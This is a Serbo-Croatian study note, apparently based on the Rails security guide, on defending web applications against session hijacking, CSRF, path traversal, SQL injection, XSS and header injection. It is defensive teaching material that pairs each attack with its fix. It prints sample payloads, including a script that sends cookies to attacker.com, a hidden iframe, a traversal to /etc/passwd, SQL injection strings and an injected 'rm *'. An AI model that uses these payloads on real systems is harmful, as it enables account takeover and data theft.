# Uvod

Napadi na aplikaciju ukljucuju:

- hijacking
- zaobilazenje kontrole pristupa
- citanje i mijenjanje osjetljivih podataka
- predstavljenje varljivog sadrzaja
- podmetanje Trojanskog konja

Da bi razvili sigurnu web aplikaciju, morate biti pripravni na svim "frontovima" i poznavati neprijatelja. Zato treba razumjeti metode napade da bi primijenili adekvatnu zastitu. 

# Sesije

Apliacije uglavnom vode racuna o stanju odredjenog korisnika (Pr. sadrzaj korpe trenutno ulogovanog korisnika). Bez sesija, dolazilo bi do  identifikuje za svaki zahtjev. Rails kreira novu sesiju ako novi korisnik pristupi aplikaciji, a ucita postojecu ako je korisnik vec koristio aplikaciju. 

Sesija se obicno sastoji od hesirane vrijednosti id-ja sesije, koja je 32-bitni string. Svaki cookie poslat pretrazivacu klijenta ima id sesije, i obratno. 

```
session[:user_id] = @current_user.id
User.find(session[:user_id])
```

## Session Hijacking

Cookie sluzi za privremenu autentikaciju korisnika. Ko god ga ima, moze da koristi aplikaciju kao taj korisnik. Bezicni LAN je primjer nebezbijedne mreze po ovom pitanju. Da bi se zastitila aplikacija, treba dodati ovu liniju u application config fajl:

```
config.force_ssl = true
```

Mnogi korisnici nemaju obicaj da obrisu cookie-je nakon krada na javnom terminalu. Ako nisu izlogovani, bilo ko bi mogao da koristi aplikaciju kao tad korisnik. Zato treba obezbijediti napadno ``log-out`` dugme.

##  Session Guidelines

- Ne cuvajte ogromne objekte u sesiji. Sacuvajte iih u bazi, a neka je samo id u sesiji. 
- Povjerljivi podaci nikad ne treba da se cuvaju u sesiji. Ako korisnik obrise cookie-je, obrisace i te podatke. 

## Session Storage

Rails obezbjedjuje nekoliko mehanizama za cuvanje hesheva sesije, od kojih je najvazniji ``ActionDispatch::Session::CookieStore.`` 

- Cookies su najvise 4KB
- Klijent mozde da cita cookie-je. Da bi se izbjeglo podmetanje, server racuna tajni digest i dodaje ga na kraj cookie-ja.

``config.secret_key_base`` se koristi za odredjivanje onog kljuca koji ce da verifikuje sesije. Nalazi se u ``config/initializers/secret_token.rb``:

```
YourApp::Application.config.secret_key_base = '49d3f3de9ed86c74b94ad6bd0...'
``` 

## Replay Attacks for CookieStore Sessions

- Korisnik ima odredjeni iznos na kartici, i kao je taj iznos sacuvan u sesiji
- Kopira cookie
- Kupi nesto
- Umanjen iznos se cuva u sesiji
- Novi cookie mijenja starim 
- Opet ima isto novca kao prije kupovine

Treba ukljuciti neku random vrijendost u sesiju, ili, najbolje, nikako ne cuvati ovakve podatke u sesiji, vec u bazi.

## Session Fixation

![Slika1](http://guides.rubyonrails.org/images/session_fixation.png) 

Ovaj napad se fokusira na prepravku id-ja sesije korisnika poznatog koji je poznat napadacu, i primoravanje korisnika da koristi bas taj id. 

Najbolje je izdavati novi id i proglasavanje starog nevazecim, nakon svakog uspjesnog logovanja. To radi jedna linija koda:

```
reset_session
```

ALternativa je koriscenje user-specific svojstava u sesiji, verifikovanje istoh svaki put kad dodje zahtjev. 

## Session Expiry

Mozemo staviti rok kada cookie sa tim id-jem sesije istice i cuvati takve sesije na strani servera, da ih klijent ne bi mijenjao . Zato mozemo da dodamo metod koji brise sesije koje nisu koriscene u poslednjih 20 minuta pozivom ``Session.sweep("20 minutes")``.

```
class Session < ActiveRecord::Base
  def self.sweep(time = 1.hour)
    if time.is_a?(String)
      time = time.split.inject { |count, unit| count.to_i.send(unit) }
    end
 
    delete_all "updated_at < '#{time.ago.to_s(:db)}'"
  end
end
```

Ovo se moze popraviti imjenom linije ``delete_all..``, jer napadac bi mogao da odrzava sesiju zivom. Izmjena:

```
delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
  created_at < '#{2.days.ago.to_s(:db)}'"
```


# Cross-Site Request Forgery (CSRF)

Napadac moze da ukljuci svoj kod ili link na stranicu  nase aplikacije. 

![Slika2](http://guides.rubyonrails.org/images/csrf.png)

Da bi se zastitili, ovu liniju dodati u controller aplkacije:

```
protect_from_forgery
```

To ce automatski ukljuciti sigurnosni token u sve forme i Ajax zahtjeve koje Rails generise. Ako se token ne poklapa sa tim sto ocekujemo, sesija se resetuje. 

Ako koristimo neke persistent sesije za podatke o korisnicima. Tada CSRF protekcija ne radi, i dodajemo metod u ``ApplicationController`` kada token nije prisutan z(za non-GET zahtjeve):

```
def handle_unverified_request
  super
  sign_out_user # Example method that will destroy the user cookies.
end
```

#  Redirection and Files
##  Redirection

Kad god je korisnik u mogucnosti da proslijedi cijeli URL ili njegove djelove, postoji opasnost od napada. Ocigledan napad bi bio redirekcija korisnika na laznu web aplikaciju koja je prividno ista kao prava. To je tzv. ``phishing-attack``. 
Kako sve izgleda nesumnjivo, korsnik ce lagano kliknuti na link koji pocinje bas kao ocekivani, rijetko se obraca paznja na ono na sta link prosledjuje:

```
 http://www.example.com/site/redirect?to= www.attacker.com. 
```

Najbolje je provjeriti whitelist-om ili regularnim izrazom URL redirekcije i ne dozvoljavati korisniku da prosledjuje djeolove URL-a. 

## File Uploads

Ako aplikacija dozvoljava korisniku da upload-uje fajl, njegovo ime uvijek mora biti filterisano, da ne bi neki zlonamjerni korisnik iskoristio taj propust i prepisao fajl na serveru. I u ovom slucaju se preferira whitelist pristup: u slucaju nedozvoljenih imena fajlova, odbijte ih, ali ih nemojte ukloniti. Evo metoda za to:

```
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.sub! /\A.*(\\|\/)/, ''
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub! /[^\w\.\-]/, '_'
  end
end
```

Takodje je preporucljivo da upload fajlova bude asinhron, jer u slucaju sinhronog, napadac moze poceti upload sa mnogih racunara i oborti server.

##  Executable Code in File Uploads

Apache web server ima opciju DocumentRoot. To je kao home direktorijum za web site, i sve u njemu server opsluzuje. Kod u fajlovima sa odre]enim ekstenzijama se izvrsava cim se taj fajl download-uje. Dakle, ako je Appache-ov DocumenRoot Rails-ov ``public`` direktorijum, ne upload-ovati fajlove tamo, nego bar jedan nivo nize. 

##  File Downloads


Ne smije se dozvoliti download svih fajlova. ``send_file`` metod salje fajlove sa servera klijentu:

```
send_file('/var/www/uploads/' + params[:filename])
```

Ako napadac proslijedi nesto kao "../../../etc/passwd", moze skinuti login informacije. Jednostavno resenje bi bilo provjeriti da li je zahtijevani fajl u ocekivanom direktorijumu:

```
basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename !=
     File.expand_path(File.join(File.dirname(filename), '../../../'))
send_file filename, disposition: 'inline'
```

Alternativa je sacuvati imena fajlova u bazi, a imenovati fajlove na disku po id-jevima iz baze. Tako se sprecava i izvrsavanje koda u upload-ovanom fajlu. 

# Intranet and Admin Security

Interfejsi za intranet i administraciju su popularne mete napada, jer omogucavaju priviligovan pristup. Potencijalne prijetnje su Trojanci (rijetki), XSS i CSRF.

XSS - Ako aplikacija ponovno prikazuje maliciozni input korisnika sa extraneta, aplikacija je potencijalno nesigurna na XSS (Cross-site scripting).

- Bitno je razmisljati o najgorem scenariju: Sta ako se neko domogne cookie-ja ili akreditacije korisnika? Mogli bi kreirati uloge (roles) za admin interfejs, ili dodati specijanu login akreditaciju (credentials) drugaciju od one za javni dio aplikacije, ili specijalan password za ozbiljnije akcije.

- Da li administrator stvarno mora da ima omogcen pristup sa bilo kog mjesta u svijetu? Mogli bi ograniciti login na nekoliko IP adresa. Ovo nije bas najsigurnije, a i proxy moze da pravi problem.

- Staviti administratorski nterfejs na poseban sub-domain kao sto  je admin.application.com i neka to bude posebna aplikacija sa posebnim menadzmentom. Ovim se onemogucava kradja cookie-ja sa www.application.com, jer vazi same origin policy. 

# User Management

Dobri dodaci za Rails, kao sto su devise i authlogic, cuvaju samo sifrovane passworde.
Svaki novi korisnik e-mail linkom dobija aktivacioni kod da aktivira nalog. Kad je aktiviran, activation_code kolona u bazi se setuje na NULL. Korisnik je sada ulogovan kao prvi aktivni korisnik pronadjen u bazi (a sanse su velike da je u pitanju administrator). Adrese:

```
http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=
```

bi omogucile pristup tom prvom korisniku. Rails izvrsava sledecu kontrolu:

```
User.find_by_activation_code(params[:id])
```
Evo kako SQL upit izgleda:

```
SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
```

Budite na oprezu za ovakve propuste i neka dodaci budu up to date. 


## Brute-Forcing Accounts

Nije pametno imati na nekoj stranici spisak svih korisnickih imena, jer onda njih napadac moze da koristi i da im nasumicno pridruzuje password. Takodje je losa praksa prikazivati poruke tipa: "the user name you entered has not been found". Umjesto taga, uvijek koristiti genericke poruke: "username or password not correct".

Pametno je i zahtijevati da se unese CAPTCHA posle nekoliko uzastopnih promasaja sa iste IP adrese. 

## Account Hijacking
### Passwords

Ako je napadac ukrao cookie, ako moze lako da promijeni password, u nekoliko klikova ce hijack-ovati nalog. Zato, pri mijenjanju passworda, zahtijevati i stari password. 

### E-mail

Napadac moze preuzeti nalog i mijenjanjem e-mail adrese. Nakon sto je promijene, mogu otici na forgotten-password stranu i novi password ce dobiti na novoj e-mail adresi. Treba zahtijevati da se unese password pri mijenjanju e-mail adrese. 

## CAPTCHA

![Slika3](http://www.marketplace.org/sites/default/files/styles/primary-image-610x340/public/captcha.png?itok=U0iRBeYa)

Koristi se da korisnik dokaze da je covjek, ne bot, da bi se zastitili od spam robota.

Negativna CAPTCHA se koristi da se dokaze da je korisnik bot:

- postavite polja forme van vidljive povrsine stranice
- neka polja budu jako mala ili iste boje kao pozadina
- neka polja budu prikazana, ali neka pise da ih ne treba popunjavati

##  Logging

Iz logova, naravno, ptreba iskljuciti passworde:

```
config.filter_parameters << :password
```

## Good Passwords

Analiza 34 000 stvarnih lozinki sa MySpace-a pokazala je da je najcescih 20 passworda: password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1, and monkey.

Svi znamo kako bi password trebalo da izgleda: da nije rijec iz recnika, da nije nikakav datum vezan za korisnika (rodjendan, godisnjica), da ima specijalne karaktere, da je dugacak, da ima velika i mala slova, brojeve i da nigdje nije zapisan.

## Regularni izrazi

Cesta zamka u Rails aplikacijama je match-ovanje pocetka i kraja stringa sa ^ i $ umjesto \A i \z. Prva varijanta match-uje pocetak i kraj linije, ne citavog stringa. 

## Privilege Escalation

Svaki parametar moze da se primijeni, bez obzira koliko ga sakrivate, a to moze biti dovoljno da korisnik izgubi pravo pristupa. Primjer: http://www.domain.com/project/1.

```
@project = Project.find(params[:id])
```

Ispravka:

```
@project = @current_user.projects.find(params[:id])
```

Ukoliko korisnik nema pravo da vidi sve projekte, koristiti drugu liniju koda.
Pravilo: svaki korisnicki input je nesiguran dok se ne dokaze suprotno. 

# Injection
## Whitelists Vs. Blacklists

Uvijek preferirajte Whitelists!
- before_action: only [...], ne except[...]
- ne ispravljajte neodgovarajuci korisnicki unos - odbacite ga

## SQL Injection

Sluzi za zaobilazenje autentifikacije. 

```
Project.where("name = '#{params[:name]}'")
```

Ako napadac doda ' OR 1 --' (-- ignorisu sve nakon toga), upit postaje:

```
SELECT * FROM projects WHERE name = '' OR 1 --'
```

I pristupice svim projektima.
Resenje ovakvih napada je izbjegavanje je koriscenje Model.find(id) ili Model.find_by_some thing(something), a kod where upita:

```
Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
```
ili
```
Model.where(login: entered_user_name, password: entered_password).first
```

## XSS (Cross-Site Scripting)

XSS napadi rade na sledecem principu: napadac ubaci neki kod (injects), web aplikacija ga sacuva i kasnije prikaze na stranici. 

```
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">

<script>document.write(document.cookie);</script>

<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>

<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>

```
50% ovakvih napada uspije!

- filterisati maliciozni input (Whitelist!!)

```
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```
Drugo, dobra je praksa izbjegavanje svakog output-a aplikacije, narocito ako se prikazuje ono sto je korsnik unio. Koristimo excapeHTML() metod za mijenjanje  &, ", <, >  redom ``&amp;, &quot;, &lt;, i &gt;``. Ukoliko ste zaboravni, koristite SafeErb  plugin koji ce vas na ovo podsjecati. 

## Obfuscation and Encoding Injection

Unicode karakteri, koje pretrazivac obradjuje, ali aplikacija mozda ne, mogu biti prijetnja.Primjer napada:

```
IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
#(pops up message box)
```

sanatize() ce ovo prepoznati. 

## Textile Injection

Ako zelimo da formatiranje teksta ne bude u HTML-u, koristimo mark-up jezik koji se, na strani servera, prevodi u HTML. Potencijalno mjesto napada. 

Ovakav jezik za Ruby je RedCloth:

```
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
``` 

Koristi se ``:filter_html``, da se eliminise sve sto Textile nije proizveo (mada su neke stvari dizajnom predvidjene da ostanu):

```
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
```
Whitelist ce pomoci i u ovom slucaju. 

## Command Line Injection

Ukoliko aplikacija izvrsava neke shell komande (exec(command), syscall(command), system(command), command), treba biti oprezan jer se jedna komanda moze nadovezati na drugu uz ``|`` ili ``;``. Zastita: ``system(command, parameters)``

```
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
```

##  Header Injection

HTTP hederi se generisu dinamicki i u nekim okolnostima mogu biti injectovani. To je lazno redirektovanje, XSS ili HTTP response splitting (nije moguce za verzije Rails 2.0.5 i kasnije).

Izmedju ostalih, HTTP hederi imaju polja: Referer, User-Agent i Cookie. 
Response heredi imaju status code, Cookie i Location (redirection target URL) polja. Svakim poljem se sa manje ili vise truda moze manipulisati, zato i njih ne zaboravite escapovati. 

Kada je, na primjer, dio hedera zasnovan na korisnickom inputu, postavimo referer polje forme i redirektujemo tamo:
```
redirect_to params[:referer]
```
Prva stvar koju bi napadac uradio:
```
http://www.yourapplication.com/controller
action?referer=http://www.malicious.tld
```

# Unsafe Query Generation

Moguce je izvrsiti neocekivane upite ako je IS NULL u where dijelu. Primjer:

```
unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end
```

Ako je params[:token] jedan od: [], [nil, [nil, nil, ...] ili ['foo', nil], proci ce test; IS NULL ili IN ('foo', NULL)  where dio ce ipak biti dodan SQL upitu. 

config.action_dispatch.perform_deep_munge = true
(mijenja ove vrijednosti u nil)
